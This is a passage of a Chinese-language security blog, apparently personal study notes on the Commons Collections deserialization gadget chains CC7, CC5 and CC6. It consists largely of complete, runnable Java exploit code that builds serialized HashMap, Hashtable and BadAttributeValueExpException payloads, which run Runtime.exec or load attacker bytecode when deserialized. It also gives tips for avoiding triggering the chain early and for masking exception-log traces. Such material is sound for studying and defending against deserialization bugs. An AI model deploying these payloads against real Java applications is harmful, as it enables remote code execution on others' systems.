java.nio.file.Paths; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.io.FileOutputStream; import java.io.FileInputStream; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\Test.class\u0026#34;)); TemplatesImpl mpl =new TemplatesImpl(); setFieldValue(mpl,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(mpl,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(mpl,\u0026#34;_class\u0026#34;,null); setFieldValue(mpl,\u0026#34;_tfactory\u0026#34;,new TransformerFactoryImpl()); Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(2)}; Transformer[] chainPart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(fakeTransformer); Hashtable hashtable = new Hashtable(); Map hashMap0 = new HashMap(); hashMap0.put(\u0026#34;yy\u0026#34;,1); Map lazy0 = LazyMap.decorate(hashMap0,chain); Map hashMap1 = new HashMap(); hashMap1.put(\u0026#34;zZ\u0026#34;,1); Map lazy1 = LazyMap.decorate(hashMap1,chain); hashtable.put(lazy0,1); hashtable.put(lazy1,1); hashMap1.remove(\u0026#34;yy\u0026#34;); Field field1 = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); field1.setAccessible(true); field1.set(chain,chainPart); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hashtable); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object mpl,String name,Object value) throws Exception { Field field = mpl.getClass().getDeclaredField(name); field.setAccessible(true); field.set(mpl,value); } } 重点还是代码的理解。\n问题：\n不加键值对直接到size()问题 哈希碰撞问题 为什么对LazyMap使用put时的键值对的值需要相同，可能是内部类Node那里的hashCode方法原因。 ","date":"2024-07-23T22:53:06+08:00","permalink":"https://fupanc-w1n.github.io/p/cc7/","title":"CC7"},{"content":"CC5 在前面CC6的学习中，我们在找LazyMap.get()的其他调用链时，找到了org.apache.commons.collections.keyvalue.TiedMapEntry类，在CC6中，我们着重于调用TiedMapEntry类hashCode()方法从而可以调用到getValue()方法：\n但是纵观TiedMapEntry类的源码，还可以看到一个toString()方法：\n这个类也可以调用到TiedMapEntry类的getValue()方法，现在就是看是否还有哪个类可以调用到这个方法，也就是CC5要解决的问题。\n测试环境：\nJDK 8u411 commons-collections 3.2.1 代码调试 在ysoserial链中，我们可以看见新利用到了一个类，BadAttributeValueExpException，这个类位于javax.management.BadAttributeValueExpException，\n这里需要知道一个知识点：如果一个类没有实现Serializable接口，但只要某个类的祖先类（父类、祖父类等）实现了Serializable接口，那么其所有子类也被认为是可序列化的。\nBadAttributeValueException类部分源码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 public class BadAttributeValueExpException extends Exception { private static final long serialVersionUID = -3105272988410493376L; private Object val; public BadAttributeValueExpException (Object val) { this.val = val == null ? null : val.toString(); } public String toString() { return \u0026#34;BadAttributeValueException: \u0026#34; + val; } private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException { ObjectInputStream.GetField gf = ois.readFields(); Object valObj = gf.get(\u0026#34;val\u0026#34;, null); if (valObj == null) { val = null; } else if (valObj instanceof String) { val= valObj; } else if (System.getSecurityManager() == null || valObj instanceof Long || valObj instanceof Integer || valObj instanceof Float || valObj instanceof Double || valObj instanceof Byte || valObj instanceof Short || valObj instanceof Boolean) { val = valObj.toString(); } else { // the serialized object is from a version without JDK-8019292 fix val = System.identityHashCode(valObj) + \u0026#34;@\u0026#34; + valObj.getClass().getName(); } } } 虽然这个类没有实现Serializable接口，但是其父类Exception的父类Throwable实现了Serializable接口，所以BadAttributeValueException也是可以序列化的。\n个人思考 现在继续来看源码，我看到了这个类的构造方法： 这是一个三元操作符，如果val不为null，则返回val.toString()，既然这里是构造方法，我想到了CC3的利用方法，只要我们构造了val为我们设置好的TiedMapEntry类，那么我们是否能够成功调用。\n在CC3利用到了InstantiateTransformer类，那么在这里再尝试利用一下。\n想了一下，理论上应该是可以的，没得好大意义吗，因为最终在反序列化的时候还是需要调用其他类的readObject()，以CC3的HashMap为例，还是构建下代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 package org.example; import javax.management.BadAttributeValueExpException; import java.util.HashMap; import java.util.Map; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import javax.xml.transform.Templates; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.InstantiateTransformer; import org.apache.commons.collections.map.LazyMap; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl ctf = new TemplatesImpl(); setFieldValue(ctf,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(ctf,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(ctf, \u0026#34;_class\u0026#34;, null); setFieldValue(ctf, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); Transformer[] chainPart = new Transformer[]{new ConstantTransformer(TrAXFilter.class),new InstantiateTransformer(new Class[]{Templates.class},new Object[]{ctf})}; Transformer chain = new ChainedTransformer(chainPart); Map hash0 = new HashMap(); Map lazy0 = LazyMap.decorate(hash0,chain); TiedMapEntry haha0 = new TiedMapEntry(lazy0,\u0026#34;fupanc0\u0026#34;); Transformer[] realTransformer = new Transformer[]{new ConstantTransformer(BadAttributeValueExpException.class),new InstantiateTransformer(new Class[]{Object.class},new Object[]{haha0})}; Transformer outerMap = new ChainedTransformer(realTransformer); Map hash1 = new HashMap(); Map lazy1 = LazyMap.decorate(hash1,outerMap); TiedMapEntry haha1 = new TiedMapEntry(lazy1,\u0026#34;fupanc1\u0026#34;); HashMap hashMap = new HashMap(); hashMap.put(haha1,\u0026#34;xxxx\u0026#34;); //错误点 hash1.remove(\u0026#34;fupanc1\u0026#34;); hash0.remove(\u0026#34;fupanc0\u0026#34;); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hashMap); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } 代码有问题，在运行后是成功在put部分弹出计算机，这说明代码逻辑应该没问题，并且跟源码发现前面确实在按预期走，在弹出计算机后在后面的InstantiateTransformer#transforme的catch的var6部分后一点突然结束了，导致程序直接结束，让后面的remove和序列化等操作都无法实现，有点怪，先遗留这个问题，等后面学深了再来想。\n除了上面无法全部运行的问题，还有看代码，其实可以说是多此一举了，定义了两个TiedMapEntry来实现，就简单了解一下就行了。\n现在来尝试解决一下，既然问题是在序列化的时候就弹出计算机，并且调试了一下，问题应该是在动态加载字节码这里，结合全部CC链的知识点，那么是否我们可以先假再真呢？\n尝试一下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 package org.example; import javax.management.BadAttributeValueExpException; import java.util.HashMap; import java.util.Map; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import javax.xml.transform.Templates; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.InstantiateTransformer; import org.apache.commons.collections.map.LazyMap; import java.lang.reflect.Field; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl ctf = new TemplatesImpl(); setFieldValue(ctf,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(ctf,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(ctf, \u0026#34;_class\u0026#34;, null); setFieldValue(ctf, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); Transformer[] chainPart = new Transformer[]{new ConstantTransformer(TrAXFilter.class),new InstantiateTransformer(new Class[]{Templates.class},new Object[]{ctf})}; Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(fakeTransformer); Map hash0 = new HashMap(); Map lazy0 = LazyMap.decorate(hash0,chain); TiedMapEntry haha0 = new TiedMapEntry(lazy0,\u0026#34;fupanc0\u0026#34;); Transformer[] realTransformer = new Transformer[]{new ConstantTransformer(BadAttributeValueExpException.class),new InstantiateTransformer(new Class[]{Object.class},new Object[]{haha0})}; Transformer outerMap = new ChainedTransformer(realTransformer); Map hash1 = new HashMap(); Map lazy1 = LazyMap.decorate(hash1,outerMap); TiedMapEntry haha1 = new TiedMapEntry(lazy1,\u0026#34;fupanc1\u0026#34;); HashMap hashMap = new HashMap(); hashMap.put(haha1,\u0026#34;xxxx\u0026#34;); hash1.remove(\u0026#34;fupanc1\u0026#34;); hash0.remove(\u0026#34;fupanc0\u0026#34;); Field field1 = chain.getClass().getDeclaredField(\u0026#34;iTransformers\u0026#34;); field1.setAccessible(true); field1.set(chain,chainPart); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hashMap); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } 成功在反序列化时弹出计算机\n正式学习 继续看源码，我们看BadAttributeValueExpException的readObject()方法，这里也利用了toString()方法：\n看这个readObject()方法，valObj是从gf中的val参数获取的，而gf又是从反序列化流中读取的。所以我们只要控制了BadAttributeValueExpException类的val参数，就相当于控制了valObj，所以我们这里需要将val设置为TiedMapEntry类的实例。\n继续看代码，只要我们传入的val的值不是String类型，并且符合第三个条件中的的任意一个，就可以成功进入第三个条件的语句，从而可以执行TiedMapEntry类的toString()方法。\n在java中，Sysyem.getSecurityManager()的返回值默认是null，看如下测试语句：\n所以一般是可以进入到这个语句的。\n那么现在就差构造了，思路就是将一个设置好了的TiedMapEntry类传给val就行，结合前面学过的代码，可以先随便传，再反射修改即可，所以可以如下构造代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 package org.example; import javax.management.BadAttributeValueExpException; import java.util.HashMap; import java.util.Map; import java.lang.reflect.Field; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { Transformer[] chainPart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(chainPart); Map hash = new HashMap(); Map lazy = LazyMap.decorate(hash,chain); TiedMapEntry outerMap = new TiedMapEntry(lazy,\u0026#34;fupanc\u0026#34;); Object o = new BadAttributeValueExpException(null); Field x = BadAttributeValueExpException.class.getDeclaredField(\u0026#34;val\u0026#34;); x.setAccessible(true); x.set(o,outerMap); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(o); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } } 成功弹出计算机。\n同样的如果你想使用其他类型，比如结合动态加载字节码之类的，基本都是只用改一下chainPart那里的链就行。\n问题 子父类的序列化问题 ","date":"2024-07-21T22:53:06+08:00","permalink":"https://fupanc-w1n.github.io/p/cc5/","title":"CC5"},{"content":"CC6 在CC1已经说过了，在JDK 8u71以后，官方修改了AnnotationInvocationHandler的readObject()方法，导致CC1不能再利用。\n所以现在需要找寻新的利用链用于解决高版本Java的问题，现在先来看这个利用链。\n测试环境\nJDK 8u411 commons-collections 3.2.1 代码调试 在前面的CC1的LazyMap链中利用的就是get()方法，那么现在其实还可以寻找在上下文中是否还有其他调用LazyMap#get()的类，并且要求这个可利用的类实现了Serializable接口。 在这里找到的类是org.apache.commons.collections.keyvalue.TiedMapEntry，重点就是下面的两个方法，分别是：\n1 2 3 4 5 6 7 8 9 //getValue() public Object getValue() { return this.map.get(this.key); } //hashCode() public int hashCode() { Object value = this.getValue(); return (this.getKey() == null ? 0 : this.getKey().hashCode()) ^ (value == null ? 0 : value.hashCode()); } 在这里可以看到在hashCode()方法中调用了getValue()方法，在getValue()方法中的this.map.get(this.key);，只要这里可以将this.map的值设置为LazyMap的实例，就又可以成为一个利用链的起始点。\n所以现在需要先找到可以使用什么类来触发TiedMapEntry#hashCode()方法，在这里，同样的有两条链子，分别是HashMap和HashSet\n利用HashMap 利用链代码审计 此时我想到了URLDNS链，其中有一个步骤调用了hashCode()方法，如下： 这里就是调用的key的hashCode方法，在URLDNS中的这个key对应的是URL类实例，所以URLDNS中调用的是URL类的hashCode()方法，那么现在其实也比较简单了，先大概想一下流程：\n这里肯定是用HashMap作为序列化以及反序列化的对象 很简单了，然后在反序的时候自然会到hash()方法，此时我们需要在要序列化的代码中put进一个key为TiedMapEntry类的实例，让这个key等于TiedMapEntry对象，这样就会顺利调用到TiedMapEntry类的hashCode()方法，然后再将TiedMapEntry类里面的map设置为LazyMap类的实例，这样就会成功调用到LazyMap类的get方法，后面就是CC1中提过的了。 流程基本清楚，现在就是如何设计代码了\n然后就是看如何传入基本盘了，基本盘如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 //基本盘 package org.example; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import java.lang.annotation.Retention; public class Main{ public static void main(String[] args) throws Exception { Transformer chain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(Retention.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{null,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;})}); } } 现在就是需要将这个基本盘传入TiedMapEntry类，看一下这个类的构造方法：\n都是public，那么直接引入即可，所以这里的利用代码就是：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 package org.example; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import java.lang.annotation.Retention; import org.apache.commons.collections.keyvalue.TiedMapEntry; import java.util.HashMap; import java.util.Map; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.Runtime; public class Main{ public static void main(String[] args) throws Exception { Transformer chain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{null,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;})}); Map lazy = LazyMap.decorate(null,chain); TiedMapEntry o = new TiedMapEntry(lazy,null); HashMap hashMap = new HashMap(); hashMap.put(o,\u0026#34;xxx\u0026#34;); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hashMap); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } } 报错显示在实例化LazyMap那里不能传入null，\n那么我就再创一个HashMap实例进去赋值，那么测试代码就是：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 package org.example; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import java.lang.annotation.Retention; import org.apache.commons.collections.keyvalue.TiedMapEntry; import java.util.HashMap; import java.util.Map; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.Runtime; public class Main{ public static void main(String[] args) throws Exception { Transformer chain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{null,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;})}); Map haha = new HashMap(); Map lazy = LazyMap.decorate(haha,chain); TiedMapEntry o = new TiedMapEntry(lazy,null); HashMap hashMap = new HashMap(); hashMap.put(o,\u0026#34;xxx\u0026#34;); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hashMap); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } } 运行结果如下：\n虽然成功弹出计算机，本来也以为只是平常的报错，然后去看了一下其他文章，发现是自己的代码有问题，首先就是在hashMap.put()，本身的put()方法就是与HashMap#readObject()的部分源码相同：\n这样在put时就会触发一次利用链，这也是为什么会弹出计算机的原因（后面会说这个的解决方法）。\n再来看这个报错内容：\n这个报错内容显示我在序列化过程中试图序列化一个不可序列化的exec执行后返回的Process对象，然后前面的CC1却没有报这样的错，这里就看看差别(个人理解，仅供参考)：\n对于前面的错误代码：首先就是我们new了一个HashMap实例，然后我们往里面put进了一个TiedMapEntry类实例，而在序列化HashMap时，会遍历 HashMap 中的每个 Map.Entry 对象（即键值对），并序列化每个键值对，而对于每个 Map.Entry，ObjectOutputStream 会调用它们的 getKey() 和 getValue() 方法来获取键和值，以便对它们进行序列化，然后ObjectOutputStream的writeObject方法就会尝试去序列化。\n然后由于我们设置的值，传入了TiedMapEntry类实例，在调用getValue()后会进入LazyMap的get()方法从而导致整条利用链的进行，然后Runtime.getRuntime().exec(\u0026quot;calc\u0026quot;)，这个调用会尝试启动一个新进程，返回一个不可序列化的 Process 对象。用一个代码测试一下是否会遍历：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 import java.lang.Runtime; import java.util.HashMap; import java.io.Serializable; import java.io.ObjectOutputStream; import java.io.ObjectInputStream; import java.io.FileInputStream; import java.io.FileOutputStream; public class Main implements Serializable { public static void main(String args[]) throws Exception { HashMap o = new HashMap(); Runtime x = Runtime.getRuntime(); o.put(x,\u0026#34;xxx\u0026#34;); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(o); out.close(); } } 运行结果： 说明确实在HashMap序列化的时候会遍历条目并调用writeObject()方法对其进行序列化，如果要序列化的对象没有定义writeObject()方法，就会调用默认的writeObject()方法去序列化它（对于默认个人理解应该是ObjectOutputStream的writeObject方法）。\n结合前面的解释，那么就是由于调用了TiedMapEntry的getValue()方法，然后进行链式反应，最终会返回一个Process对象作为这个\u0026quot;value\u0026quot;，但是由于这个对象是不可被序列化的，所以最终会报错不可被序列化。\n那么对于CC1中的LazyMap链：那里通过使用 AnnotationInvocationHandler 代理包装 LazyMap，避免在序列化过程中触发变换器链，避免了异常。 ——————\n那么对于这个问题的解决方法，ysoserial早在CC1中就有了优化： 它这里是最后才将恶意transformers数组设置到transformerChain中，解决问题的方法就在这里。\n同时注意看基本盘代码里面，添加了一个ConstantTransformer(1)，这是为了隐藏异常日志中的信息，起到了隐蔽启动进程的日志特征的作用。以CC1为例看一下使用过后的差别： 使用前的特征：\n使用后的特征：\n使用后同样成功弹出计算机，但是这里的异常日志特征已经被改变了。\n解决方法就在里面，所以我们可以在利用链的最后加上一个new ConstantTransformer(1)，熟悉这个类的transformer()方法就可以知道，这里不会管传入的input，这里就会直接返回一个1，再结合正常的例如put(1,\u0026quot;xxx\u0026quot;)这种，这样在序列化时就不会报无法序列化的错误，同时也可以起到隐藏日志的作用。\n所以修改后的POC为：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 package org.example; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import java.util.HashMap; import java.util.Map; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.Runtime; public class Main{ public static void main(String[] args) throws Exception { Transformer chain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{null,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}),new ConstantTransformer(1)}); Map haha = new HashMap(); Map lazy = LazyMap.decorate(haha,chain); TiedMapEntry o = new TiedMapEntry(lazy,null); HashMap hashMap = new HashMap(); hashMap.put(o,\u0026#34;xxx\u0026#34;); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hashMap); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } } 没有报错，但是还是没有成功反序列化，否则应该会弹出两个计算机。\n调试一下，加断点如下： 在调试过程中发现如下情况\n也就是这里的if条件并没有通过，还显示一个null，就是因为我在传初始化TiedMapEntry时将key设置为了null，而调用get()方法的逻辑是将key传进去了的：\n这也是为什么在LazyMap的get()方法中显示的是null。\n所以需要改一下POC，这里直接将key设置成一个可见字符就行了，具体看后面的代码。\n同时解决一个问题：在序列化之前调用put()时会弹出计算机的问题 思路：可以先传入一个假的“链”，在put过后再调用反射将这个利用链传回去。\n看这个ChainedTransformer的利用的变量： 也就是这个iTransformers变量，所以我们可以这样干，看代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 //先定义一个假的transformer Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; //再声明一个利用链 Transformer[] chainpart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}),new ConstantTransformer(1)}; //先传入假的transformer Transformer chain = new ChainedTransformer(fakeTransformer); Map haha = new HashMap(); Map lazy = LazyMap.decorate(haha,chain); TiedMapEntry outerMap = new TiedMapEntry(lazy,\u0026#34;fupanc\u0026#34;); HashMap hashMap = new HashMap(); hashMap.put(outerMap,\u0026#34;fupanc\u0026#34;); //在put过后，在序列化之前，调用反射将假的链换成真的chainpart Field x = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); x.setAccessible(true); x.set(chain,chainpart); //然后再进行序列化 整合进全部代码就是：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 package org.example; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import java.util.HashMap; import java.util.Map; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.Runtime; import java.lang.reflect.Field; public class Main{ public static void main(String[] args) throws Exception { Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainpart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(fakeTransformer); Map haha = new HashMap(); Map lazy = LazyMap.decorate(haha,chain); TiedMapEntry outerMap = new TiedMapEntry(lazy,\u0026#34;fupanc\u0026#34;); HashMap hashMap = new HashMap(); hashMap.put(outerMap,\u0026#34;fupanc\u0026#34;); Field x = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); x.setAccessible(true); x.set(chain,chainpart); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hashMap); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } } 成功不再弹出由于put而引起的计算机，但是反序列化化石灭有弹出计算机。\n那么为什么没有反序列化成功弹出计算机？同样调试，发现：\n这里的key是fupanc，也就是我们在实例化时TiedMapEntry传入的\u0026quot;fupanc\u0026quot;，对于这里的key为fupanc很正常\n但是这里的get()方法的if条件没有通过的原因，也就是说明有对象中有fupanc这个键，那么为什么会出现这个现象呢，看代码\n原因就是这个，put方法追溯源码后也会调用hashCode()方法，但是我们这里传入了TiedMapEntry类对象的outerMap，所以这里也会进入到LazyMap#get()，剩下重点看get()方法的源码： 我们第一次确实是没有key为fupanc的键值对，但是看get()方法的源码，在进入if条件后，这里经过transform方法返回value，在if语句的最后调用了this.map.put(key,value); 